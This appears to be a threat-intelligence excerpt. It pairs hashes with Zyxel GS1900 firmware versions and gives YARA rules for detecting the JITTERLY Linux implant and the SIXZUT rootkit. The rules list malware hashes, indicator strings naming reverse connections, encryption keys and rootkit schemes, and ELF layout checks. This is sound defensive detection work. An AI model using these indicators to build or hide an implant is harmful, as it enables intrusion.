| 42ecd8c1df1961b5e14139f95491165256d3bd9d4c915ef74cbc6918a50a6be3 | GS1900-10HP_2.90(AAZI.1)C0 GS1900-16_2.90(AAHJ.1)C0 GS1900-24_2.90(AAHL.1)C0 GS1900-24E_2.90(AAHK.1)C0 GS1900-24EP_2.90(ABTO.1)C0 GS1900-24HPv2_2.90(ABTP.1)C0 GS1900-48_2.90(AAHN.1)C0 GS1900-48HPv2_2.90(ABTQ.1)C0 GS1900-8_2.90(AAHH.1)C0 GS1900-8HP_2.90(AAHI.1)C0 |
| 7dc47078f0ff2d75de4a7cd71895d01f0cce4728517f5efd94e2212975ceb811 | GS1900-10HP_2.90(AAZI.2)C0 GS1900-16_2.90(AAHJ.2)C0 GS1900-24_2.90(AAHL.2)C0 GS1900-24E_2.90(AAHK.2)C0 GS1900-24EP_2.90(ABTO.2)C0 GS1900-24HPv2_2.90(ABTP.2)C0 GS1900-48_2.90(AAHN.2)C0 GS1900-48HPv2_2.90(ABTQ.2)C0 GS1900-8_2.90(AAHH.2)C0 GS1900-8HP_2.90(AAHI.2)C0 |

###  YARA rules  (malware)
```c
import "elf"
rule JITTERLY {
  meta:
    description = "JITTERLY ELF implant"
    author      = "Binarly"
    reference   = "https://www.acronis.com/en/tru/posts/red-heron-exploits-gitea-n-day-flaw-in-multinational-campaign-exposing-new-linux-rootkit/"
    date        = "2026-09-16"
    namespace   = "malware"
    severity    = "high"
    hash        = "f264f04f597a2bdda372a27ae701c18d4036175b1eb8722db5f8531615b38788"
    hash        = "82d072ab03d90c0131b06a576eadf2c986a51f0de986d50db4e49be01bf125cb"
    hash        = "663a8088faca8e126a11648f5671fcf4eaf96435e10daf63a1d1b17d8385154c"
  strings:
    $ = "jitter" fullword
    $ = "nginx" fullword
    $ = "/etc/machine-id" fullword
    $ = "/proc/sys/kernel/random/boot_id" fullword
    $ = "USER" fullword
    $ = "LOGNAME" fullword
    $ = "00:00:00:00:00:00" fullword
    $ = "reverse" fullword
    $ = "VERSION_ID=" fullword
    $ = "NAME=" fullword
    $ = "encrypt_key" fullword
    $ = "rootkit_scheme" fullword
    $ = "/sys/class/net" fullword
    $ = "screenshot not supported" fullword
    $ = "job not found" fullword
  condition:
    filesize < 2MB and elf.number_of_segments > 1 and all of them
}
rule SIXZUT {
  meta:
    description = "SIXZUT ring3 rootkit dropped by JITTERLY"
    author      = "Binarly"
    reference   = "https://www.acronis.com/en/tru/posts/red-heron-exploits-gitea-n-day-flaw-in-multinational-campaign-exposing-new-linux-rootkit/"
    date        = "2026-09-16"
    namespace   = "malware"
    severity    = "high"
    hash        = "295133156b6a7d95b9c92f832f49e35235f1fbd3906e75c9202ef4cd65d1018c"
    hash        = "3992cff217d615b321e0844bf4a44942891653418b79ef42ee0abe07c90264b4"
    hash        = "64677002011bc2e4bc642a4154a20fdb95620ebd0144b98fc60f917901ec8b92"
    hash        = "728810b07e911b235f6450e784391e39f68819a0a5d209662162916ffea25146"
    hash        = "c19b185a1404317fbf711c7f596d39260d3d080c08ca0f93b4df322d432ecd83"
    hash        = "c285df843c35392214d129818b3634f1f134bd568a5f502d629cb07dee18a62e"
    hash        = "f9491b781edc2710f419a5bf70c5439fdb0d2a9d6f509edf9ff4819edf0366b3"
  strings:
    $deadcode = { DE AD C0 DE AD C2 CF 67 47 54 42 4C 56 30 30 31 }
    $         = "/tmp/.X11-unix.lk" fullword
    $         = "%*d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X" fullword
    $         = "/proc/%d/cmdline" fullword
  condition:
    filesize < 100KB and elf.type == elf.ET_DYN
    and for any seg in elf.segments: (
      seg.flags == (elf.PF_R | elf.PF_W)
      and @deadcode >= seg.offset
      and @deadcode < (seg.offset + 0x500)
    )
    and all of them
}
```
